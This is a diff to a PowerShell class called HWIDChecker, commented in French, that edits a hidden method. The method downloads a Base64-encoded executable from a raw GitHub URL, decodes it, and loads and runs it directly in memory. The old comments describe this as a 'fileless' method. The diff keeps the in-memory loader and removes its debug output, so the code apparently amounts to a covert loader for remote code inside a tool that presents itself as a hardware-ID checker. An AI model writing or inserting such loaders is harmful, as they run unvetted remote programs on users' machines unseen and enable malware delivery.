@@ -49,61 +49,29 @@ class HWIDChecker {
     
     hidden [void]ExecutePowerShellScript() {
         try {
-            # Methode fileless directe (sans Donut) - charge l'exe directement en memoire
+            # Methode file.txt (Base64) - fonctionne avec les exe .NET Framework + Costura.Fody
+            # COPIE EXACTE de script.ps1 qui fonctionne
             Write-Host "Telechargement de l'executable..." -ForegroundColor Yellow
-            $urls = @(
-                "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/file.txt"
-            )
-            $maxRetries = 3
-            $retryDelay = 2
-            $base64 = $null
+            $url = "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/file.txt"
             
-            foreach ($url in $urls) {
-                Write-Host "Essai avec: $url" -ForegroundColor Cyan
-                for ($i = 1; $i -le $maxRetries; $i++) {
-                    try {
-                        $base64 = Invoke-RestMethod -Uri $url -TimeoutSec 30
-                        Write-Host "Executable telecharge depuis $url : $($base64.Length) caracteres" -ForegroundColor Green
-                        break
-                    }
-                    catch {
-                        if ($i -eq $maxRetries) {
-                            Write-Host "Echec avec $url apres $maxRetries tentatives" -ForegroundColor Red
-                            if ($url -eq $urls[-1]) {
-                                throw "Impossible de telecharger l'executable depuis toutes les URLs"
-                            }
-                        }
-                        else {
-                            Write-Host "Tentative $i/$maxRetries echouee, nouvelle tentative dans $retryDelay secondes..." -ForegroundColor Yellow
-                            Start-Sleep -Seconds $retryDelay
-                        }
-                    }
-                }
-                if ($null -ne $base64) {
-                    break
-                }
-            }
-            
-            if ($null -eq $base64) {
-                throw "Impossible de telecharger l'executable"
-            }
+            $base64 = Invoke-RestMethod -Uri $url -TimeoutSec 30
+            Write-Host "Executable telecharge : $($base64.Length) caracteres" -ForegroundColor Green
             
             Write-Host "Decodage et chargement en memoire..." -ForegroundColor Yellow
             $bytes = [Convert]::FromBase64String($base64)
             
-            # Variable script pour que le handler puisse y acceder (closures ne fonctionnent pas dans les classes)
-            $script:mainAssembly = $null
+            # Variable script pour que le handler y accede (closures ne fonctionnent pas dans les classes)
+            $script:mainAssemblyForResolve = $null
+            
             # Handler pour resoudre les dependances emballees (Costura.Fody)
-            # IMPORTANT: Ajouter le handler AVANT de charger l'assembly (comme dans script.ps1)
+            # Adapte de script.ps1 pour fonctionner dans une classe (utilise $script:)
             $onAssemblyResolve = {
                 param($sender, $e)
                 $assemblyName = $e.Name.Split(',')[0].ToLowerInvariant()
-                Write-Host "[DEBUG] AssemblyResolve appele pour: $assemblyName" -ForegroundColor Magenta
                 
                 # Chercher dans les ressources de l'assembly principal charge
-                if ($script:mainAssembly -ne $null) {
-                    $resourceNames = $script:mainAssembly.GetManifestResourceNames()
-                    Write-Host "[DEBUG] Ressources trouvees: $($resourceNames -join ', ')" -ForegroundColor Magenta
+                if ($script:mainAssemblyForResolve -ne $null) {
+                    $resourceNames = $script:mainAssemblyForResolve.GetManifestResourceNames()
                     
                     # Format Costura: costura.{assemblyname}.dll.compressed ou costura.{assemblyname}.dll
                     $searchPatterns = @(
@@ -115,12 +83,10 @@ class HWIDChecker {
                     
                     foreach ($pattern in $searchPatterns) {
                         $resourceName = $resourceNames | Where-Object { $_ -like $pattern }
-                        Write-Host "[DEBUG] Pattern '$pattern' -> Ressource: $resourceName" -ForegroundColor Cyan
                         
                         if ($resourceName) {
-                            Write-Host "[DEBUG] Chargement de la ressource: $resourceName" -ForegroundColor Green
                             try {
-                                $stream = $script:mainAssembly.GetManifestResourceStream($resourceName)
+                                $stream = $script:mainAssemblyForResolve.GetManifestResourceStream($resourceName)
                                 if ($stream -ne $null) {
                                     $assemblyBytes = $null
                                     
@@ -139,34 +105,25 @@ class HWIDChecker {
                                     }
                                     
                                     $stream.Close()
-                                    Write-Host "[DEBUG] Assembly charge avec succes: $assemblyName" -ForegroundColor Green
                                     return [System.Reflection.Assembly]::Load($assemblyBytes)
                                 }
                             }
                             catch {
-                                Write-Host "[DEBUG] ERREUR lors du chargement: $($_.Exception.Message)" -ForegroundColor Red
+                                # Ignorer les erreurs de lecture
                             }
                         }
                     }
-                    Write-Host "[DEBUG] Aucune ressource trouvee pour: $assemblyName" -ForegroundColor Yellow
-                }
-                else {
-                    Write-Host "[DEBUG] mainAssembly est null!" -ForegroundColor Red
                 }
                 return $null
             }
+            
             # Ajouter le handler AVANT de charger l'assembly (comme dans script.ps1)
             [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)
             
             # Maintenant charger l'assembly (le handler sera appele si besoin)
-            $script:mainAssembly = [System.Reflection.Assembly]::Load($bytes)
+            $script:mainAssemblyForResolve = [System.Reflection.Assembly]::Load($bytes)
             
-            # Debug: Lister toutes les ressources Costura disponibles
-            $allResources = $script:mainAssembly.GetManifestResourceNames()
-            $costuraResources = $allResources | Where-Object { $_ -like "costura.*" }
-            Write-Host "[DEBUG] Ressources Costura trouvees: $($costuraResources -join ', ')" -ForegroundColor Cyan
-            
-            $entryPoint = $script:mainAssembly.EntryPoint
+            $entryPoint = $script:mainAssemblyForResolve.EntryPoint
             if ($entryPoint -ne $null) {
                 Write-Host "Execution de l'application..." -ForegroundColor Yellow
                 $entryPoint.Invoke($null, @())
